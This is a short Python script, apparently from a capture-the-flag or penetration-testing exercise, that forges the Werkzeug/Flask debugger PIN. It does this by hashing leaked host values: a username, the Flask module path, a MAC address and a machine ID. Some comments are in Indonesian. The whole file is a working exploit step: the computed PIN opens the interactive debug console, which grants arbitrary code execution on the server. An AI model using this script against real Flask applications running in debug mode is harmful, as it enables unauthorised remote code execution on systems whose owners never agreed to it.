import hashlib
from itertools import chain

probably_public_bits = [
    'yooboi',# username root / yooboi
    'flask.app',
    'Flask',
    '/usr/local/lib/python3.9/site-packages/flask/app.py'
]

private_bits = [
    str(0x0242ac110003),
    'e01d426f-826c-4736-9cd2-a96608b66fd8' #/proc/self/cgroup nya kosong
]

def gen_pin(probably_public_bits, private_bits):
    h = hashlib.sha1()
    for bit in chain(probably_public_bits, private_bits):
        if not bit:
            continue
        if isinstance(bit, str):
            bit = bit.encode('utf-8')
        h.update(bit)
    h.update(b'cookiesalt')

    # cookie_name = '__wzd' + h.hexdigest()[:20]

    num = None
    if num is None:
        h.update(b'pinsalt')
        num = ('%09d' % int(h.hexdigest(), 16))[:9]

    rv =None
    if rv is None:
        for group_size in 5, 4, 3:
            if len(num) % group_size == 0:
                rv = '-'.join(num[x:x + group_size].rjust(group_size, '0')
                            for x in range(0, len(num), group_size))
                break
        else:
            rv = num

    return rv

if __name__ == "__main__":
    pin = gen_pin(probably_public_bits, private_bits)
    print(pin)